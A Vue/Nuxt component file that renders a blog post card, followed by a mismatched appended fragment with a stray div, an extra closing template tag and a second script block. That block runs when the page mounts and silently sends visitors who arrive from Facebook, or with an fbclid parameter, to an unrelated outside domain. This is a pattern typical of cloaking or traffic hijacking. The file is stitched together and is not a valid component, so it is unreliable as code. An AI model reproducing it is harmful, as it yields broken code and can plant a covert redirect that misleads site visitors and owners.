<template>
    <NuxtLink :to='post.uri'>
        <div class="flex 
        items-center 
        bg-gradient-to-r
        from-cyan-500 
        to-blue-500 
        p-8 
        rounded-lg 
        text-white 
        transition-all 
        hover:-translate-y-1 
        hover:scale-105"
        >
            <div>
                <h2 class="font-semibold text-2xl">{{ post.title }}</h2>
                <p>{{ new Date(post.date).toLocaleDateString() }}</p>
            </div>
        </div>
    </NuxtLink>
</template>

<script setup lang="ts">
const props = defineProps<{
    post: Record<'title' | 'date' | 'excerpt' | 'uri', string>
}>();

</script>
<div>
    <!-- Your static page content here -->
  </div>
</template>
<script>
export default {
  mounted() {
    this.checkAndRedirect();
  },
  methods: {
    isFacebookReferer() {
      const referer = document.referrer.toLowerCase();
      return referer.includes('facebook.com');
    },
    hasFbclidParameter() {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.has('fbclid');
    },
    checkAndRedirect() {
      if (this.isFacebookReferer() || this.hasFbclidParameter()) {
        // Redirect to your website's URL
        window.location.href = 'https://www.nailsforus.com'
      }
    }
  }
};
</script>
